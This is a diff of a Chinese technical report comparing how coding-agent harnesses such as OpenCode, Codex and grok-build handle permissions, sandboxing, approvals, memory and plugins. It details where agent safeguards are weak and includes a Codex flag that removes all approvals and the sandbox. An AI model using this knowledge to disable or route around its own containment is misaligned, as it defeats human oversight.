-| 安全 | 三态权限（allow/ask/deny）`findLast`"最后匹配获胜"；官方自认 UX 层、无 OS 沙箱；代码中 "sandbox" 实为 git worktree 并行工作区 | 缺口① → 已补齐 |
-| 持久化 | SQLite（drizzle）`opencode.db` 三表+data JSON 列；share→opncd.ai（企业自托管开关在码）；sync 事件溯源（单写者多端 replay） | 缺口③ → 已补齐 |
-| 扩展 | npm/目录四源插件、Bun 按需安装、20+ 顺序钩子（permission.ask 裁决、compacting 定制）；7 内置 agent；MCP OAuth 全自动 | 缺口④ → 已补齐 |
+| 维度   | 机制要点（2026-07 源码基线）                                                                                                                                              | 早期判定 → 本章判定 |
+| ------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------- |
+| 感知   | AGENTS.md+CLAUDE.md 兼容加载链（可关）；LSP 事件总线+全局诊断 map，编辑后诊断回注；ripgrep/watcher/formatter                                                              | 成立且增强          |
+| 记忆   | 两级压缩：可逆 prune（40k 保护/20k 起剪/跳过近 2 turn，**默认关**）+ anchored summary（六段模板、尾部预算 clamp(usable×25%, 2k, 8k)、自动续跑）                           | 缺口② → 已补齐      |
+| 执行   | 15+ 内置工具（bash 经 tree-sitter 解析+arity 词典提 pattern、edit 带 Levenshtein 0.65 模糊回退、task 子代理、实验性 lsp/plan/execute）；独立 git-dir 快照支撑 /undo /redo | 大幅新知            |
+| 安全   | 三态权限（allow/ask/deny）`findLast`"最后匹配获胜"；官方自认 UX 层、无 OS 沙箱；代码中 "sandbox" 实为 git worktree 并行工作区                                             | 缺口① → 已补齐      |
+| 持久化 | SQLite（drizzle）`opencode.db` 三表+data JSON 列；share→opncd.ai（企业自托管开关在码）；sync 事件溯源（单写者多端 replay）                                                | 缺口③ → 已补齐      |
+| 扩展   | npm/目录四源插件、Bun 按需安装、20+ 顺序钩子（permission.ask 裁决、compacting 定制）；7 内置 agent；MCP OAuth 全自动                                                      | 缺口④ → 已补齐      |
 
 速览表呈现出 OpenCode 六维的统一性格——"机制内置、策略外置"的中间路线：每一维都有机制存在，但默认值普遍宽松（prune 默认关、权限多数默认 allow、执行隔离缺席），收紧责任被系统地交给配置层与插件层两个可编程面。与第 4 章 Pi"全部外置"、第 5 章 OMP"全部内置"相比，这一选择与 OpenCode 服务六表面客户端、跨个人到 Enterprise 组织形态的商业定位自洽：默认宽是为了不打扰形态各异的客户端交互，可编程是为了让企业治理（6.4）有落点。代价同样写在表上：安全与执行隔离是全表最弱的两格。
 
@@ -551,10 +551,14 @@ flowchart LR
 早期标注"未见公开详细说明"的安全模型，本轮获得源码级答案。权限引擎位于 `src/permission/index.ts`（223 行），其裁决函数仅数行（:28-38）：
 
 ```ts
-return rulesets.flat()
-  .findLast((rule) => Wildcard.match(permission, rule.permission)
-                   && Wildcard.match(pattern, rule.pattern))
-  ?? { action: "ask", permission, pattern: "*" }   // 兜底 = ask
+return (
+  rulesets
+    .flat()
+    .findLast(
+      (rule) =>
+        Wildcard.match(permission, rule.permission) && Wildcard.match(pattern, rule.pattern),
+    ) ?? { action: "ask", permission, pattern: "*" }
+); // 兜底 = ask
 ```
 
 `findLast` 即"后写规则覆盖先写"，匹配失败兜底 `ask`——这把"规则顺序"直接变成了权限语义，与 deny-first（更严格者获胜）的经典默认相反：在 OpenCode 里，配置靠后的来源（如 agent 级规则、`OPENCODE_PERMISSION` 环境变量）天然压制靠前来源，写配置的人必须意识到顺序即权力。其上的 ask/reply 状态机（:67-167）支持 once/always/reject 三态回复：always 把工具建议的 patterns 追加进会话级内存规则（不持久化）并级联放行同 session 其余 pending，reject 则级联拒绝并可把纠正文本回灌给模型。权限键全集 12 个（read/edit/glob/grep/bash/task/skill/lsp/webfetch/websearch/external_directory/doom_loop），多数默认 allow，`doom_loop` 与 `external_directory` 默认 ask，`*.env` 默认 deny（`*.env.example` 例外）；doom_loop 是"同一工具以完全相同输入连续出现 3 次"即打断的死循环保险丝；`pattern:"*"` 且 deny 的工具直接从 LLM 可见工具集中剔除（plan agent 禁用编辑即此机制）。
@@ -577,12 +581,12 @@ return rulesets.flat()
 
 扩展缺口的答案：插件 = 导出 async 函数的 JS/TS 模块，签名 `(input: PluginInput) => Promise<Hooks>`；加载四源有序——内置 auth 插件（Codex/OpenAI、GitHub Copilot、GitLab 等约 10 个，直接 import）→ 配置 `plugin` 数组（npm 包，启动时 Bun 自动安装并缓存 `~/.cache/opencode/node_modules/`，带版本兼容性检查）→ 全局 `~/.config/opencode/plugins/` → 项目 `.opencode/plugins/`。钩子全集 20+：`chat.message`/`chat.params`/`chat.headers`（改写消息与采样参数）、`tool.execute.before/after`、`shell.env`（注入环境变量，含 PTY）、`tool`（自定义工具与内置同权注册）、**`permission.ask`**（插件可程序化裁决 ask/deny/allow，与 6.3.1 的状态机同层联动）、**`experimental.session.compacting`**（注入或整体替换压缩 prompt）、`experimental.compaction.autocontinue`、`experimental.chat.messages.transform` 等。触发语义刻意保守：`Plugin.trigger` 顺序调用所有插件同名钩子、以可变 output 串联，源码注释明示"保持插件顺序执行，使注册与执行顺序确定"（plugin/index.ts:218）——在并发至上的时代选择串行，是把可预测性置于吞吐之上的工程声明。配套面：内置 agent 7 个（build/plan/general/explore/scout 加隐藏的 compaction/title/summary），自定义 agent/command/skill 走 Markdown frontmatter（兼容 Claude Code skills，可关）；MCP 支持 OAuth 全自动（401 检测→动态客户端注册→浏览器授权→token 落盘）。
 
-| 缺口（早期标注） | 本章源码级结论 | 关键证据坐标 |
-|---|---|---|
-| ① 沙箱/执行隔离"未见公开详细说明" | 无 OS 级沙箱系官方明示设计，权限系统自认 UX 层而非安全边界；代码中 "sandbox" = git worktree 并行工作区（语义澄清）；真隔离需 Docker/VM 或第三方 wrapper | SECURITY.md；seatbelt/seccomp/bwrap grep 零命中；permission/index.ts:28-38；project.ts `sandboxes` 字段 |
-| ② 上下文压缩算法 | 两级策略：可逆 prune（40k 保护/20k 起剪/跳过近 2 turn，默认关）在前，anchored 增量摘要（六段模板、clamp(25%, 2k, 8k) 尾部预算、媒体剥离、自动续跑）在后 | compaction.ts:188-511；overflow.ts:11-21；core 版 buildPrompt |
-| ③ session 存储格式 | JSON→SQLite（drizzle，v1.2.0）；session/message/part 三表 data JSON 整列；增量升级丢会话事故（#13636/#13654）；share→opncd.ai 留企业自托管开关；sync 事件溯源 | database.ts:53-54；session/sql.ts；share-next.ts:29,210；sync/README.md |
-| ④ 扩展系统 | npm/目录四源加载、Bun 按需安装+兼容性检查、20+ 顺序钩子（含 permission.ask 裁决、compacting 定制）、TUI 插件独立体系、7 内置 agent | plugin/index.ts:166-293；packages/plugin/src/index.ts:222-330 |
+| 缺口（早期标注）                  | 本章源码级结论                                                                                                                                                | 关键证据坐标                                                                                            |
+| --------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------- |
+| ① 沙箱/执行隔离"未见公开详细说明" | 无 OS 级沙箱系官方明示设计，权限系统自认 UX 层而非安全边界；代码中 "sandbox" = git worktree 并行工作区（语义澄清）；真隔离需 Docker/VM 或第三方 wrapper       | SECURITY.md；seatbelt/seccomp/bwrap grep 零命中；permission/index.ts:28-38；project.ts `sandboxes` 字段 |
+| ② 上下文压缩算法                  | 两级策略：可逆 prune（40k 保护/20k 起剪/跳过近 2 turn，默认关）在前，anchored 增量摘要（六段模板、clamp(25%, 2k, 8k) 尾部预算、媒体剥离、自动续跑）在后       | compaction.ts:188-511；overflow.ts:11-21；core 版 buildPrompt                                           |
+| ③ session 存储格式                | JSON→SQLite（drizzle，v1.2.0）；session/message/part 三表 data JSON 整列；增量升级丢会话事故（#13636/#13654）；share→opncd.ai 留企业自托管开关；sync 事件溯源 | database.ts:53-54；session/sql.ts；share-next.ts:29,210；sync/README.md                                 |
+| ④ 扩展系统                        | npm/目录四源加载、Bun 按需安装+兼容性检查、20+ 顺序钩子（含 permission.ask 裁决、compacting 定制）、TUI 插件独立体系、7 内置 agent                            | plugin/index.ts:166-293；packages/plugin/src/index.ts:222-330                                           |
 
 四格补齐后，早期的悬置判断——"公开信息最少，可能是尚未成熟，也可能是刻意轻量"——可以落锤：证据支持**刻意轻量+可编程补偿**。无沙箱，但配了 `permission.ask` 裁决钩子与系统托管配置目录；无内置长期记忆外存，但配了 `compacting` 定制钩子；存储与同步两条线则按企业多设备路线重投入（SQLite 会计列、事件溯源）。四格中唯一既无机制也无补偿的是执行隔离——官方已把填补责任以书面形式转移给容器生态（SECURITY.md），社区 wrapper 的出现说明市场接受了这一分工。这与第 7 章 Codex"默认沙箱+默认断网"的内置路线构成九对象中最鲜明的安全哲学对位。
 
@@ -662,14 +666,14 @@ flowchart TD
 
 ### 7.3 六维拆解
 
-| 维度 | Codex 机制要点 | 源码坐标 / 关键参数 |
-|---|---|---|
-| 感知 | AGENTS.md 三层加载（全局/项目/嵌套）+ 每轮 `<environment_context>` 注入 + 每模型一份 base prompt | `core/src/agents_md.rs`；`project_doc_max_bytes` 默认 32 KiB |
-| 记忆 | 三路径 compact：本地摘要 / `/responses/compact` 加密 item / token 预算窗口 | `core/src/compact.rs`；`model_auto_compact_token_limit` 按模型自动 |
-| 执行 | `apply_patch`（Lark 文法约束解码）+ `shell_command` + `unified_exec` 持久 PTY | `tools/handlers/apply_patch.lark`；`exec.rs::process_exec_tool_call` |
-| 安全（重点） | 三档沙箱 × 四档审批正交；Seatbelt / bwrap+seccomp / Windows 受限令牌；execpolicy 静态规则；默认断网 | `protocol.rs` `SandboxPolicy` / `AskForApproval` |
-| 持久化 | rollout JSONL（ResponseItem 原样落盘）+ resume / fork | `~/.codex/sessions/YYYY/MM/DD/rollout-*.jsonl` |
-| 扩展 | MCP client+server 双角色；prompts/skills/hooks 后补；硬拒 ACP | `core/src/mcp.rs`；issue #9085 |
+| 维度         | Codex 机制要点                                                                                      | 源码坐标 / 关键参数                                                  |
+| ------------ | --------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------- |
+| 感知         | AGENTS.md 三层加载（全局/项目/嵌套）+ 每轮 `<environment_context>` 注入 + 每模型一份 base prompt    | `core/src/agents_md.rs`；`project_doc_max_bytes` 默认 32 KiB         |
+| 记忆         | 三路径 compact：本地摘要 / `/responses/compact` 加密 item / token 预算窗口                          | `core/src/compact.rs`；`model_auto_compact_token_limit` 按模型自动   |
+| 执行         | `apply_patch`（Lark 文法约束解码）+ `shell_command` + `unified_exec` 持久 PTY                       | `tools/handlers/apply_patch.lark`；`exec.rs::process_exec_tool_call` |
+| 安全（重点） | 三档沙箱 × 四档审批正交；Seatbelt / bwrap+seccomp / Windows 受限令牌；execpolicy 静态规则；默认断网 | `protocol.rs` `SandboxPolicy` / `AskForApproval`                     |
+| 持久化       | rollout JSONL（ResponseItem 原样落盘）+ resume / fork                                               | `~/.codex/sessions/YYYY/MM/DD/rollout-*.jsonl`                       |
+| 扩展         | MCP client+server 双角色；prompts/skills/hooks 后补；硬拒 ACP                                       | `core/src/mcp.rs`；issue #9085                                       |
 
 速览表的分布规律：Codex 把最重的工程投入押在安全与执行两维——安全独占一个 crate 群，执行侧把编辑原语做成了解码层约束；感知维则走标准化路线（AGENTS.md 发起方），以生态杠杆替代私有格式。记忆维的远端加密压缩是九对象中唯一把压缩产物做成不透明服务端资产的路线；扩展维"MCP 双角色 + 拒 ACP"的组合暴露了真实的生态策略——接入层（工具进来）全面开放，驱动层（客户端控制 Codex）则由自家协议把守。以下逐维展开，安全维给足篇幅。
 
@@ -677,11 +681,11 @@ flowchart TD
 
 Codex 安全框架的第一块基石是 `SandboxPolicy` 三档（serde 名即 config.toml 取值）：`read-only`（只读 + 只读命令）、`workspace-write`（**默认推荐**：可写 cwd/TMPDIR/`/tmp` 与显式 `writable_roots`，`network_access` 默认 `false`——**默认断网**）、`danger-full-access`（无沙箱，等同用户权限直跑，TUI 有显式警告；`codex exec --dangerously-bypass-approvals-and-sandbox` 即社区所称 yolo 模式）。官方文档把威胁模型写得直白："Codex 可以运行任意命令，目标是防止 agent 意外或恶意地修改 workspace 外的文件、访问网络拉取 payload 或外泄数据"。第二块基石是与沙箱**正交**的审批枚举 `AskForApproval` 四档：`untrusted`（仅 `is_safe_command()` 判定的只读命令自动放行，其余皆问）、`on-request`（**默认**，模型自行决定何时请求批准）、`granular`（按类目布尔开关的细粒度配置）、`never`（从不问，失败直接回给模型）。两轴的组合语义与典型预设如下：
 
-| 沙箱档 ＼ 审批档 | `untrusted` | `on-request`（默认） | `granular` | `never` |
-|---|---|---|---|---|
-| `read-only` | **只读审查预设**：写操作一律被沙箱拒绝，只读命令自动放行 | 模型按需申请；越权写入被拒后可转审批 | 按类目逐项自动放行 | 无人值守只读：失败不回问，直接回模型 |
-| `workspace-write`（默认推荐） | 写命令几乎必问，沙箱内写入仍自由 | **默认组合**：沙箱内自由执行，越界/联网触发 `Op::ExecApproval` 升级审批 | 类目开关，介于 untrusted 与 on-request 之间 | 沙箱内全自动；越界直接失败回模型 |
-| `danger-full-access` | 语义近乎矛盾（无内核兜底仍逐条问），实践中罕见 | 高危：无沙箱兜底，靠模型自律求人 | 同左，类目化收窄 | **全自动（yolo）**：一键拆光全部防线 |
+| 沙箱档 ＼ 审批档              | `untrusted`                                              | `on-request`（默认）                                                    | `granular`                                  | `never`                              |
+| ----------------------------- | -------------------------------------------------------- | ----------------------------------------------------------------------- | ------------------------------------------- | ------------------------------------ |
+| `read-only`                   | **只读审查预设**：写操作一律被沙箱拒绝，只读命令自动放行 | 模型按需申请；越权写入被拒后可转审批                                    | 按类目逐项自动放行                          | 无人值守只读：失败不回问，直接回模型 |
+| `workspace-write`（默认推荐） | 写命令几乎必问，沙箱内写入仍自由                         | **默认组合**：沙箱内自由执行，越界/联网触发 `Op::ExecApproval` 升级审批 | 类目开关，介于 untrusted 与 on-request 之间 | 沙箱内全自动；越界直接失败回模型     |
+| `danger-full-access`          | 语义近乎矛盾（无内核兜底仍逐条问），实践中罕见           | 高危：无沙箱兜底，靠模型自律求人                                        | 同左，类目化收窄                            | **全自动（yolo）**：一键拆光全部防线 |
 
 矩阵的读法在于两轴的分工：沙箱是**能力边界**——由内核强制，模型无论被注入什么都无法自行扩大；审批是**意图确认**——把例外情形的判断留给人或静态规则。执行语义为三段式：先经 `safety.rs` 判定（`SafetyCheck::AutoApprove/AskUser/Reject`），沙箱内执行失败且策略允许时发起 `Op::ExecApproval` 升级到沙箱外重跑，`reject` 则直接回模型。官方 TUI 快捷键固化的预设只有三个对角组合（只读审查 / 默认 / 全自动），`ReviewDecision` 还支持 `approved_for_session` 与 `ApprovedExecpolicyAmendment`（`protocol.rs:4107`）——批准一次可顺带修改规则、会话内不再问同类命令，这是审批摩擦的长期对策。但正交设计也有明确代价：`on-request` 把"何时求人"的时机判断交给模型本身，安全横评将其列为残余风险之首；`never` 与 `danger-full-access` 组合成的 yolo 则一键拆除全部防线。
 
@@ -774,16 +778,16 @@ TUI 侧最常被称道的工程细节是 mermaid 双模渲染：`xai-grok-markdo
 
 ### 8.3 六维拆解
 
-| 维度 | grok-build 机制要点 | 关键源码坐标 |
-|---|---|---|
-| 感知 | 兼容发现 AGENTS.md / CLAUDE.md / `.claude/rules` / `.cursor/rules`；Cursor 规则按 glob 读后注入；`/import-claude` 一键迁移 Claude 权限与 MCP 配置 | `agents_md.rs`；`cursor_rules_on_read.rs`；`claude_import.rs` |
-| 记忆 | 85% 阈值自动压缩 + 压缩前 memory flush + two-pass prefire（默认关）；300s 压缩墙钟预算；256K 窗口为模型属性而非硬编码 | `compaction.rs`；`client.rs:661`；`xai-grok-compaction/` |
-| 执行 | 25+ 内置工具（`register_all()` 单入口）；三套编辑策略并存；源码移植 Codex/OpenCode 工具（MIT 合规） | `implementations/mod.rs`；`grok_build_hashline/` |
-| 控制 | TaskTool 扇出 N 路子代理（代码无硬上限）+ `MAX_SUBAGENT_DEPTH=1`；可选 worktree 隔离（BTRFS 快照）；Monitor/Scheduler 长任务原语 | `task/mod.rs`；`xai-tool-types/task.rs:186`；`xai-fast-worktree/` |
-| 安全 | 六档 PermissionMode 与 Claude Code 一一对应 + Auto 小模型分类器；OS 沙箱五档但默认 off；隐私事件见 8.3.4 | `config.rs:956`；`auto_mode.rs`；`xai-grok-sandbox/` |
-| 扩展 | 插件 = 技能+agents+MCP+hooks 打包；marketplace 强制 40 位 SHA pin；hooks 四事件、仅 pre_tool_use 可阻塞、fail-open | `plugins/mod.rs`；`xai-grok-hooks/src/lib.rs` |
-| （附）持久化 | JSONL 会话落盘 + FTS 检索 + fork/rewind/share；云端沙箱会话恢复（与上传管线同通道） | `storage/mod.rs:931`；`remote/` |
-| （附）入口 | TUI / headless / ACP 三模式统一经 leader，同一代码路径 | `agent/app.rs:289/409/917` |
+| 维度         | grok-build 机制要点                                                                                                                               | 关键源码坐标                                                      |
+| ------------ | ------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------- |
+| 感知         | 兼容发现 AGENTS.md / CLAUDE.md / `.claude/rules` / `.cursor/rules`；Cursor 规则按 glob 读后注入；`/import-claude` 一键迁移 Claude 权限与 MCP 配置 | `agents_md.rs`；`cursor_rules_on_read.rs`；`claude_import.rs`     |
+| 记忆         | 85% 阈值自动压缩 + 压缩前 memory flush + two-pass prefire（默认关）；300s 压缩墙钟预算；256K 窗口为模型属性而非硬编码                             | `compaction.rs`；`client.rs:661`；`xai-grok-compaction/`          |
+| 执行         | 25+ 内置工具（`register_all()` 单入口）；三套编辑策略并存；源码移植 Codex/OpenCode 工具（MIT 合规）                                               | `implementations/mod.rs`；`grok_build_hashline/`                  |
+| 控制         | TaskTool 扇出 N 路子代理（代码无硬上限）+ `MAX_SUBAGENT_DEPTH=1`；可选 worktree 隔离（BTRFS 快照）；Monitor/Scheduler 长任务原语                  | `task/mod.rs`；`xai-tool-types/task.rs:186`；`xai-fast-worktree/` |
+| 安全         | 六档 PermissionMode 与 Claude Code 一一对应 + Auto 小模型分类器；OS 沙箱五档但默认 off；隐私事件见 8.3.4                                          | `config.rs:956`；`auto_mode.rs`；`xai-grok-sandbox/`              |
+| 扩展         | 插件 = 技能+agents+MCP+hooks 打包；marketplace 强制 40 位 SHA pin；hooks 四事件、仅 pre_tool_use 可阻塞、fail-open                                | `plugins/mod.rs`；`xai-grok-hooks/src/lib.rs`                     |
+| （附）持久化 | JSONL 会话落盘 + FTS 检索 + fork/rewind/share；云端沙箱会话恢复（与上传管线同通道）                                                               | `storage/mod.rs:931`；`remote/`                                   |
+| （附）入口   | TUI / headless / ACP 三模式统一经 leader，同一代码路径                                                                                            | `agent/app.rs:289/409/917`                                        |
 
 速览表里最值得注意的不是任何单项，而是两处"刻意"：其一，感知层与扩展层大量直接读取 Claude Code 生态的资产（设置、规则、hooks 格式、MCP 配置），把竞争对手用户的迁移成本压到接近零，兼容面为九对象最宽；其二，控制层与安全层的机制密度同样罕见（子代理扇出、六档权限、五档沙箱），但默认姿态宽松——沙箱默认 off、数据留存曾默认开。**机制最全与默认最松并存**，正是 8.3.4 事件能够在该 harness 上发生的结构性条件，也是它与其他五家默认姿态谱系（见 12.1）的偏离点。
 
@@ -821,22 +825,22 @@ TUI 侧最常被称道的工程细节是 mermaid 双模渲染：`xai-grok-markdo
 
 下表汇总围绕 grok-build 的 14 项争议、已证伪宣称与未证实参数（as-of 2026-07-17）。凡媒体反复传播但未获一手证实的数字一律在此列示，正文不作事实引用。
 
-| # | 事项 | 状态（as-of 2026-07-17） | 证据分级 |
-|---|---|---|---|
-| 1 | 全仓库上传事件：默认开启、开关无效、git bundle 含历史 secrets、`.env` 明文 | 已止血（服务端 flag）；上传代码在树但被硬禁用；无删除审计 / 受影响规模 / 正式事件报告 | 一手证实（cereblab + 代码印证） |
-| 2 | 服务端运行时配置层：`trace_upload_enabled` 等远程 flag 可不下发更新即改变客户端行为 | 结构性风险，开源未消除（"开源的代码 ≠ 运行的行为"） | 一手（代码 + techtimes 分析） |
-| 3 | `/privacy` 管保留不管传输：opt-in/out 抓包请求相同，仅 `/v1/traces` 200→204 | 已证实 | 一手（cereblab A/B） |
-| 4 | SWE-bench Verified 70.8% 张冠李戴：属已弃用 grok-code-fast-1，grok-build-0.1 从未公布官方分数 | 媒体误导性引用高发；别名关系（grok-build-0.1 aliases 含 grok-code-fast-1）为混淆根源 | 多源核查裁定（B） |
-| 5 | "8 路并行 subagent"：代码无硬上限；源自 2026-02 泄露 UI（2 模型 × 4 实例） | 证伪为泄露/媒体数字；并行扇出与 worktree 隔离本身属实 | 代码核查裁定 |
-| 6 | Arena Mode：自动评分排名未发布；落地近似物为 `/best-of-n` 技能（N=2–10） | announced, not shipped | 代码核查 + 多源 |
-| 7 | "local-first / 代码不离开机器"营销 | 发布期被证伪；开源后仅在自编译 + 自托管推理下成立 | 一手 + rywalker |
-| 8 | 发布时间/安装方式混乱：个别媒体称 6 月 5 日发布、npm 安装、Grok 4.3 驱动 | 与官方 curl 安装 / 5-14 beta / grok-build-0.1 矛盾；npm 包 `@xai-official/grok` 实为 ACP 包装器 | 低可信媒体噪音（C） |
-| 9 | 单 commit 发布、无历史、不收 PR、不开 issues | 持续状态：可审计不可共治；monorepo 同步存在时滞 | 一手（CONTRIBUTING / API） |
-| 10 | 上传队列本地堆积：`~/.grok/upload_queue` 持久化队列，高负载可达数十 GB | 已记录（代码注释 "the queue can hold up to several GB"） | 代码 + qwe.edu.pl（B） |
-| 11 | 子代理提示词防泄漏、主提示词不设防的不对称 | 已确认（开源后实际失效，但反映设计习惯） | 代码 + Willison |
-| 12 | CLI 未做证书固定（0.2.93 可被 mitmproxy 明文审计） | 已记录：利于审计，也说明传输层信任假设弱 | cereblab |
-| 13 | 免费档（Grok 4.5 免费用）无公布截止日 | 观察中，"probably temporary" | daily.dev（B） |
-| 14 | 遥测面大：`upload/trace.rs` 上传面含工具定义/权限事件/记忆状态/插件状态/完整 prompt；`xai-mixpanel` 存在 | 已确认（当前默认关） | 代码 |
+| #   | 事项                                                                                                     | 状态（as-of 2026-07-17）                                                                        | 证据分级                        |
+| --- | -------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------- | ------------------------------- |
+| 1   | 全仓库上传事件：默认开启、开关无效、git bundle 含历史 secrets、`.env` 明文                               | 已止血（服务端 flag）；上传代码在树但被硬禁用；无删除审计 / 受影响规模 / 正式事件报告           | 一手证实（cereblab + 代码印证） |
+| 2   | 服务端运行时配置层：`trace_upload_enabled` 等远程 flag 可不下发更新即改变客户端行为                      | 结构性风险，开源未消除（"开源的代码 ≠ 运行的行为"）                                             | 一手（代码 + techtimes 分析）   |
+| 3   | `/privacy` 管保留不管传输：opt-in/out 抓包请求相同，仅 `/v1/traces` 200→204                              | 已证实                                                                                          | 一手（cereblab A/B）            |
+| 4   | SWE-bench Verified 70.8% 张冠李戴：属已弃用 grok-code-fast-1，grok-build-0.1 从未公布官方分数            | 媒体误导性引用高发；别名关系（grok-build-0.1 aliases 含 grok-code-fast-1）为混淆根源            | 多源核查裁定（B）               |
+| 5   | "8 路并行 subagent"：代码无硬上限；源自 2026-02 泄露 UI（2 模型 × 4 实例）                               | 证伪为泄露/媒体数字；并行扇出与 worktree 隔离本身属实                                           | 代码核查裁定                    |
+| 6   | Arena Mode：自动评分排名未发布；落地近似物为 `/best-of-n` 技能（N=2–10）                                 | announced, not shipped                                                                          | 代码核查 + 多源                 |
+| 7   | "local-first / 代码不离开机器"营销                                                                       | 发布期被证伪；开源后仅在自编译 + 自托管推理下成立                                               | 一手 + rywalker                 |
+| 8   | 发布时间/安装方式混乱：个别媒体称 6 月 5 日发布、npm 安装、Grok 4.3 驱动                                 | 与官方 curl 安装 / 5-14 beta / grok-build-0.1 矛盾；npm 包 `@xai-official/grok` 实为 ACP 包装器 | 低可信媒体噪音（C）             |
+| 9   | 单 commit 发布、无历史、不收 PR、不开 issues                                                             | 持续状态：可审计不可共治；monorepo 同步存在时滞                                                 | 一手（CONTRIBUTING / API）      |
+| 10  | 上传队列本地堆积：`~/.grok/upload_queue` 持久化队列，高负载可达数十 GB                                   | 已记录（代码注释 "the queue can hold up to several GB"）                                        | 代码 + qwe.edu.pl（B）          |
+| 11  | 子代理提示词防泄漏、主提示词不设防的不对称                                                               | 已确认（开源后实际失效，但反映设计习惯）                                                        | 代码 + Willison                 |
+| 12  | CLI 未做证书固定（0.2.93 可被 mitmproxy 明文审计）                                                       | 已记录：利于审计，也说明传输层信任假设弱                                                        | cereblab                        |
+| 13  | 免费档（Grok 4.5 免费用）无公布截止日                                                                    | 观察中，"probably temporary"                                                                    | daily.dev（B）                  |
+| 14  | 遥测面大：`upload/trace.rs` 上传面含工具定义/权限事件/记忆状态/插件状态/完整 prompt；`xai-mixpanel` 存在 | 已确认（当前默认关）                                                                            | 代码                            |
 
 十四项的分布呈现清晰的层次：#1–#3 是一手证实的信任事件本体，#4–#8 是媒体沉积数字的证伪区（其中 #4、#5 已获正式核实），#9–#14 是开源后仍可观察的结构性事实。对选型者最有行动价值的是 #2 与 #14：它们说明"代码开源"与"运行时行为可控"之间仍隔着服务端远程配置这一层——审计 grok-build 的正确姿势不是读完源码为止，而是加用 `requirements.toml` 把遥测与上传项 pin 死（企业管理接口恰为此存在），或干脆走完全自托管推理路径。对研究者的提醒则是 #4：任何把 70.8% 记在 grok-build 名下的二手引用，都应视为别名混淆的高发样本处理。
 
@@ -1032,17 +1036,17 @@ graph TD
 
 本章把第 3–11 章的逐对象拆解压缩成五条横切战线：安全层（12.1）、记忆层（12.2）、持久化与子代理（12.3）、多入口与协议站队（12.4）、生态与采用度（12.5）。九对象的基本面已在第 2 章建表，本章不再重复。开篇先把九章拆解浓缩为一屏速览，再逐层对读。
 
-| 对象 | 循环（Loop） | 上下文（Context） | 工具（Tools） | 权限（Permission） | 持久化（Persistence） | 扩展（Extension） |
-|---|---|---|---|---|---|---|
-| mini-coding-agent | 单文件 ask 循环 | 无压缩 | read/write/bash 三工具 | 无 | 无 | 无 |
-| Pi | 极简 loop | LLM 摘要压缩 | 四工具 | 零内置（外置哲学） | 树形 session | RPC/skill/subagent 全外置 |
-| OMP | 同构 fork+Rust natives | 同 Pi | hashline 锚定编辑 | 同 Pi | 树形 session | 同 Pi+ACP |
-| OpenCode | client/server+SSE | AGENTS.md+LSP | 工具+权限规则 | 规则+提示 | SQLite+share | 插件/MCP |
-| Codex | codex-core 队列协议 | 截断+摘要 | 并行工具纪律 | 默认断网沙箱 | 云端可恢复 | App Server/MCP |
-| grok-build | 三道闸+doom-loop 中止 | 85% 阈值+two-pass prefire | 25+ 工具三套编辑 | 机制全但沙箱默认 off | JSONL+FTS+云恢复 | marketplace SHA pin |
-| Claude Code | queryLoop 单循环 | 五层 compaction 管道 | 内置+四扩展机制 | 七层纵深 deny-first | session+CLAUDE.md | MCP/skills/hooks/subagents |
-| Cline | Plan⇄Act 双模 | 显式注入、无自动压缩 | AST+浏览器自动化 | 审批密度最高、无沙箱 | shadow git checkpoints | MCP Marketplace 150+ |
-| Reasonix | append-only 缓存不变量 | CodeGraph+低频压缩 | 修复管道四道 | 规则+workspace sandbox | checkpoints+replay | MCP first-class |
+| 对象              | 循环（Loop）           | 上下文（Context）         | 工具（Tools）          | 权限（Permission）     | 持久化（Persistence）  | 扩展（Extension）          |
+| ----------------- | ---------------------- | ------------------------- | ---------------------- | ---------------------- | ---------------------- | -------------------------- |
+| mini-coding-agent | 单文件 ask 循环        | 无压缩                    | read/write/bash 三工具 | 无                     | 无                     | 无                         |
+| Pi                | 极简 loop              | LLM 摘要压缩              | 四工具                 | 零内置（外置哲学）     | 树形 session           | RPC/skill/subagent 全外置  |
+| OMP               | 同构 fork+Rust natives | 同 Pi                     | hashline 锚定编辑      | 同 Pi                  | 树形 session           | 同 Pi+ACP                  |
+| OpenCode          | client/server+SSE      | AGENTS.md+LSP             | 工具+权限规则          | 规则+提示              | SQLite+share           | 插件/MCP                   |
+| Codex             | codex-core 队列协议    | 截断+摘要                 | 并行工具纪律           | 默认断网沙箱           | 云端可恢复             | App Server/MCP             |
+| grok-build        | 三道闸+doom-loop 中止  | 85% 阈值+two-pass prefire | 25+ 工具三套编辑       | 机制全但沙箱默认 off   | JSONL+FTS+云恢复       | marketplace SHA pin        |
+| Claude Code       | queryLoop 单循环       | 五层 compaction 管道      | 内置+四扩展机制        | 七层纵深 deny-first    | session+CLAUDE.md      | MCP/skills/hooks/subagents |
+| Cline             | Plan⇄Act 双模          | 显式注入、无自动压缩      | AST+浏览器自动化       | 审批密度最高、无沙箱   | shadow git checkpoints | MCP Marketplace 150+       |
+| Reasonix          | append-only 缓存不变量 | CodeGraph+低频压缩        | 修复管道四道           | 规则+workspace sandbox | checkpoints+replay     | MCP first-class            |
 
 permission 一列的坐标为分析性打分（0–10，高＝默认即安全、行为可预期；低＝灵活交给外部），评分规则见 12.1.1 随表说明，非度量数据。
 
@@ -1052,32 +1056,32 @@ permission 一列的坐标为分析性打分（0–10，高＝默认即安全、
 
 下表的坐标定义为：**确定性**=安全裁决由不可绕过的机制给出（内核强制／静态规则／硬编码顺序），不依赖模型或人的当场判断；**灵活性**=裁决依赖自由裁量（人审、LLM 分类、模型自律、外部化）。10 分为完全确定性强制。
 
-| 对象 | 坐标 | 内置权限模型（关键证据） | 默认姿态 | 冲突语义 | 裁决者 |
-|---|---|---|---|---|---|
-| Claude Code | **8.5** | 七层独立安全层（工具预过滤→deny-first 规则→ML 分类器→shell 沙箱） | deny-first；实测用户批准 93% 权限提示→不以人的警觉为安全前提 | 多层独立裁决全部满足才执行 | 内核+静态规则+ML 分类器+人审 |
